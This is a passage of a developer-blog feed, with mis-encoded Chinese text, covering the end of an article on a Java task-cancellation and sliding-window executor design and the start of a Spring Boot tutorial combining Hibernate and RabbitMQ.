        <span class="hljs-comment">// 3. å¼‚æ­¥æäº¤å‰©ä½™ä»»åŠ¡ï¼ˆåœ¨ç‹¬ç«‹çº¿ç¨‹ä¸­ï¼‰</span>
        ListenableFuture&lt;?&gt; submittingFuture =
            TimerService.getTimer().submit(() -&gt; submitRemaining(tasks, results, start));

        <span class="hljs-keyword">return</span> AsyncBatchResult.&lt;V&gt;builder()
                .submitCanceller(submittingFuture)
                .results(results)
                .build();
    }

    <span class="hljs-comment">/**
     * æäº¤å‰©ä½™ä»»åŠ¡ï¼ˆåœ¨ç‹¬ç«‹çº¿ç¨‹æ‰§è¡Œï¼‰
     * ç­‰å¾…ä¸€ä¸ªå®Œæˆ -&gt; æäº¤ä¸‹ä¸€ä¸ª
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">submitRemaining</span><span class="hljs-params">(List&lt;? extends Callable&lt;V&gt;&gt; tasks,
                                List&lt;ListenableFuture&lt;V&gt;&gt; result,
                                <span class="hljs-type">int</span> start)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> start;
        <span class="hljs-keyword">while</span> (index &lt; tasks.size()) {
            <span class="hljs-comment">// é˜»å¡ç­‰å¾…ä»»ä½•ä¸€ä¸ªä»»åŠ¡å®Œæˆ</span>
            ListenableFuture&lt;V&gt; completed = blockingQueue.take();

            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦å·²å–æ¶ˆ</span>
            <span class="hljs-keyword">if</span> (completed.isCancelled() || result.get(index).isCancelled()
                    || Thread.interrupted()) {
                <span class="hljs-keyword">return</span> submitted;
            }

            <span class="hljs-comment">// æäº¤ä¸‹ä¸€ä¸ªä»»åŠ¡ï¼Œç»‘å®šåˆ°å¯¹åº”ä½ç½®çš„ SettableFuture</span>
            ((SettableFuture&lt;V&gt;) result.get(index))
                .setFuture(fallbackSubmit(tasks, index));
            index++;
        }
        <span class="hljs-keyword">return</span> submitted;
    }
}
</code></pre>
<p><strong>æ»‘åŠ¨çª—å£æœºåˆ¶</strong>ï¼š</p>
<ol>
<li>åˆå§‹æäº¤ N ä¸ªä»»åŠ¡ï¼ˆN = å¹¶è¡Œåº¦ï¼‰</li>
<li>ç­‰å¾…ä»»ä½•ä¸€ä¸ªå®Œæˆï¼Œé‡Šæ”¾ä¸€ä¸ª"æ§½ä½"</li>
<li>æäº¤ä¸‹ä¸€ä¸ªä»»åŠ¡</li>
<li>é‡å¤ç›´åˆ°æ‰€æœ‰ä»»åŠ¡æäº¤å®Œæˆ</li>
</ol>
<h2 data-id="heading-8">æ•´ä½“æµç¨‹</h2>
<p>ä¸‹é¢æ˜¯ <code>FlightParallelHelper.parMap</code> çš„å®Œæ•´æµç¨‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T, R&gt; AsyncBatchResult&lt;R&gt; <span class="hljs-title function_">parMap</span><span class="hljs-params">(
        List&lt;T&gt; list,
        Function&lt;? <span class="hljs-built_in">super</span> T, ? extends R&gt; function,
        ParallelOptions options,
        ListeningExecutorService executor,
        String executorName)</span> {

    <span class="hljs-keyword">if</span> (CollectionUtils.isEmpty(list)) {
        <span class="hljs-keyword">return</span> emptyBatchResult();
    }

    <span class="hljs-comment">// 1. è§„èŒƒåŒ–å‚æ•°</span>
    <span class="hljs-type">ParallelOptions</span> <span class="hljs-variable">normalizedOptions</span> <span class="hljs-operator">=</span> ParallelOptions.formalized(options, list.size());
    <span class="hljs-type">String</span> <span class="hljs-variable">taskName</span> <span class="hljs-operator">=</span> normalizedOptions.getTaskName();

    <span class="hljs-comment">// 2. åˆ›å»ºå–æ¶ˆä»¤ç‰Œï¼ˆæ­¤æ—¶æœªç»‘å®š Futureï¼‰</span>
    <span class="hljs-type">CancellationToken</span> <span class="hljs-variable">cancellationToken</span> <span class="hljs-operator">=</span> CancellationToken.create();

    <span class="hljs-comment">// 3. åŒ…è£…ä»»åŠ¡ï¼Œé™„åŠ ä¸Šä¸‹æ–‡</span>
    List&lt;Callable&lt;R&gt;&gt; tasks = list.stream()
            .map(item -&gt; {
                ScopedCallable&lt;R&gt; scopedCallable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScopedCallable</span>&lt;&gt;(
                    taskName, () -&gt; function.apply(item));
                scopedCallable.put(KEY_PARALLEL_OPTIONS, normalizedOptions);
                scopedCallable.put(KEY_CANCELLATION_TOKEN, cancellationToken);
                <span class="hljs-keyword">return</span> (Callable&lt;R&gt;) scopedCallable;
            })
            .collect(toImmutableList());

    <span class="hljs-comment">// 4. é€šè¿‡é™æµæ‰§è¡Œå™¨æäº¤ä»»åŠ¡</span>
    AsyncBatchResult&lt;R&gt; batchResult = ConcurrentLimitExecutor.&lt;R&gt;builder()
            .pool(executor)
            .options(normalizedOptions)
            .build()
            .submitAll(tasks);

    <span class="hljs-comment">// 5. å»¶è¿Ÿç»‘å®šï¼šå°† Future åˆ—è¡¨ç»‘å®šåˆ° CancellationToken</span>
    cancellationToken.lateBind(
        batchResult.getResults(),
        normalizedOptions.forTimeout(),
        batchResult.getSubmitCanceller());

    <span class="hljs-comment">// 6. è¶…æ—¶æ—¶è§¦å‘èµ„æºæ¸…ç†</span>
    tryPurgeOnTimeout(executorName, batchResult);

    <span class="hljs-keyword">return</span> batchResult;
}
</code></pre>
<h2 data-id="heading-9">æ—¶åºå›¾</h2>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Caller     â”‚   â”‚ FlightParallel   â”‚   â”‚CancellationTokenâ”‚   â”‚  Executor    â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚   <span class="hljs-built_in">parMap</span>(list)    â”‚                      â”‚                   â”‚
       â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚                      â”‚                   â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚     <span class="hljs-built_in">create</span>()         â”‚                   â”‚
       â”‚                   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚                   â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚              <span class="hljs-built_in">submitAll</span>(tasks)            â”‚
       â”‚                   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚              Future<span class="hljs-selector-attr">[]</span> results            â”‚
       â”‚                   â”‚&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚  <span class="hljs-built_in">lateBind</span>(futures)   â”‚                   â”‚
       â”‚                   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚                   â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚  AsyncBatchResult â”‚                      â”‚                   â”‚
       â”‚&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚                      â”‚                   â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚                      â”‚   ä»»åŠ¡æ‰§è¡Œ...      â”‚
       â”‚                   â”‚                      â”‚&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚                      â”‚   <span class="hljs-built_in">checkpoint</span>()    â”‚
       â”‚                   â”‚                      â”‚&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
       â”‚                   â”‚                      â”‚                   â”‚
       â”‚                   â”‚  <span class="hljs-selector-attr">[è¶…æ—¶/å¼‚å¸¸æ—¶]</span>        â”‚                   â”‚
       â”‚                   â”‚                      â”‚   <span class="hljs-built_in">cancel</span>(true)    â”‚
       â”‚                   â”‚                      â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚
       â”‚                   â”‚                      â”‚                   â”‚
</code></pre>
<h2 data-id="heading-10">åœ¨ä¸šåŠ¡ä»£ç ä¸­ä½¿ç”¨æ£€æŸ¥ç‚¹</h2>
<p>å¯¹äº CPU å¯†é›†å‹ä»»åŠ¡ï¼Œéœ€è¦åœ¨å…³é”®ä½ç½®æ’å…¥æ£€æŸ¥ç‚¹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processLargeDataSet</span><span class="hljs-params">(List&lt;Data&gt; dataList)</span> {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; dataList.size(); i++) {
        <span class="hljs-comment">// æ¯å¤„ç† 100 æ¡æ•°æ®æ£€æŸ¥ä¸€æ¬¡</span>
        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">100</span> == <span class="hljs-number">0</span>) {
            Checkpoints.checkpoint(<span class="hljs-string">"processData"</span>, <span class="hljs-literal">true</span>);
        }

        processItem(dataList.get(i));
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">complexCalculation</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// é˜¶æ®µ 1</span>
    doPhase1();
    Checkpoints.checkpoint(<span class="hljs-string">"complexCalc"</span>, <span class="hljs-literal">true</span>);

    <span class="hljs-comment">// é˜¶æ®µ 2</span>
    doPhase2();
    Checkpoints.checkpoint(<span class="hljs-string">"complexCalc"</span>, <span class="hljs-literal">true</span>);

    <span class="hljs-comment">// é˜¶æ®µ 3</span>
    doPhase3();
}
</code></pre>
<h2 data-id="heading-11">æ€»ç»“</h2>
<p>æœ¬æ–‡ä»‹ç»çš„å–æ¶ˆæœºåˆ¶åŒ…å«ä»¥ä¸‹æ ¸å¿ƒè®¾è®¡æ€æƒ³ï¼š</p>

































<table><thead><tr><th>è®¾è®¡ç‚¹</th><th>è§£å†³çš„é—®é¢˜</th></tr></thead><tbody><tr><td><strong>åä½œå¼å–æ¶ˆ</strong></td><td>Java æ— æ³•å¼ºåˆ¶ä¸­æ–­ CPU å¯†é›†å‹ä»£ç </td></tr><tr><td><strong>å»¶è¿Ÿç»‘å®š</strong></td><td>è§£å†³"å…ˆåˆ›å»º Token è¿˜æ˜¯å…ˆæäº¤ä»»åŠ¡"çš„å¾ªç¯ä¾èµ–</td></tr><tr><td><strong>çŠ¶æ€æšä¸¾</strong></td><td>æ¸…æ™°åŒºåˆ†ä¸åŒå–æ¶ˆåŸå› ï¼Œä¾¿äºç›‘æ§å’Œæ’æŸ¥</td></tr><tr><td><strong>è½»é‡çº§å¼‚å¸¸</strong></td><td>ç”Ÿäº§ç¯å¢ƒå‡å°‘å †æ ˆå¼€é”€</td></tr><tr><td><strong>æ»‘åŠ¨çª—å£æäº¤</strong></td><td>æ§åˆ¶å¹¶å‘åº¦ï¼Œé¿å…çº¿ç¨‹æ± è¿‡è½½</td></tr><tr><td><strong>ä¸Šä¸‹æ–‡ä¼ é€’</strong></td><td>ThreadLocal + Attachable å®ç°è·¨æ–¹æ³•çš„å–æ¶ˆä¿¡å·ä¼ é€’</td></tr></tbody></table>
<p>è¿™å¥—æœºåˆ¶å·²åœ¨ç”Ÿäº§ç¯å¢ƒç¨³å®šè¿è¡Œï¼Œæœ‰æ•ˆå‡å°‘äº†è¶…æ—¶åœºæ™¯ä¸‹çš„èµ„æºæµªè´¹ï¼Œæå‡äº†ç³»ç»Ÿæ•´ä½“ååèƒ½åŠ›ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ73ï¼‰å¦‚ä½•åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ä½¿ç”¨Hibernateï¼Ÿ]]></title>    <link>https://juejin.cn/post/7600967006893719561</link>    <guid>https://juejin.cn/post/7600967006893719561</guid>    <pubDate>2026-01-30T11:49:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600967006893719561" data-draft-id="7600955777315782694" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ73ï¼‰å¦‚ä½•åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ä½¿ç”¨Hibernateï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-30T11:49:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ73ï¼‰å¦‚ä½•åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ä½¿ç”¨Hibernateï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T11:49:57.000Z" title="Fri Jan 30 2026 11:49:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨äº‹ä»¶é©±åŠ¨æ¶æ„ä¸­ä½¿ç”¨Hibernateï¼Œå¯ä»¥æœ‰æ•ˆåœ°å¤„ç†æ•°æ®æŒä¹…æ€§ï¼Œå¹¶åœ¨äº‹ä»¶å‘ç”Ÿæ—¶è§¦å‘ç›¸åº”çš„æ•°æ®åº“æ“ä½œã€‚äº‹ä»¶é©±åŠ¨æ¶æ„é€šå¸¸æ¶‰åŠä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆå¦‚RabbitMQã€Kafkaç­‰ï¼‰æ¥å‘å¸ƒå’Œè®¢é˜…äº‹ä»¶ã€‚ä¸‹é¢æˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•åœ¨Spring Booté¡¹ç›®ä¸­ç»“åˆHibernateå’ŒRabbitMQå®ç°äº‹ä»¶é©±åŠ¨æ¶æ„ã€‚</p>
<h3 data-id="heading-0">1. é¡¹ç›®ä¾èµ–</h3>
<p>åœ¨<code>pom.xml</code>ä¸­æ·»åŠ å¿…è¦çš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data JPA --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL Connector --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- HikariCP for Connection Pooling --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- RabbitMQ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-amqp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-1">2. é…ç½®æ•°æ®æºå’ŒHibernateå±æ€§</h3>
<p>åœ¨<code>application.properties</code>ä¸­é…ç½®æ•°æ®æºå’ŒHibernateå±æ€§ï¼š</p>
<pre><code class="hljs language-properties" lang="properties"># MySQL Database Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/mydatabase
spring.datasource.username=root
spring.datasource.password=rootpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect

# RabbitMQ Configuration
spring.rabbitmq.host=localhost
spring.rabbitmq.port=5672
spring.rabbitmq.username=guest
spring.rabbitmq.password=guest
</code></pre>
<h3 data-id="heading-2">3. å®šä¹‰å®ä½“ç±»å’ŒDAOå±‚</h3>
<h4 data-id="heading-3"><code>Order.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;
<span class="hljs-keyword">import</span> javax.persistence.Table;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-comment">// Getters and Setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProduct</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProduct</span><span class="hljs-params">(String product)</span> {
        <span class="hljs-built_in">this</span>.product = product;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getQuantity</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setQuantity</span><span class="hljs-params">(<span class="hljs-type">int</span> quantity)</span> {
        <span class="hljs-built_in">this</span>.quantity = quantity;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> price;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-built_in">this</span>.price = price;
    }
}
</code></pre>
<h4 data-id="heading-4"><code>OrderRepository.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; {
}
</code></pre>
<h3 data-id="heading-5">4. é…ç½®RabbitMQ</h3>
<h4 data-id="heading-6"><code>RabbitMQConfig.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.amqp.core.Queue;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMQConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">orderQueue</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(<span class="hljs-string">"orderQueue"</span>, <span class="hljs-literal">true</span>);
    }
}
</code></pre>
<h3 data-id="heading-7">5. åˆ›å»ºäº‹ä»¶å’Œäº‹ä»¶å¤„ç†å™¨</h3>
<h4 data-id="heading-8"><code>OrderCreatedEvent.java</code></h4>
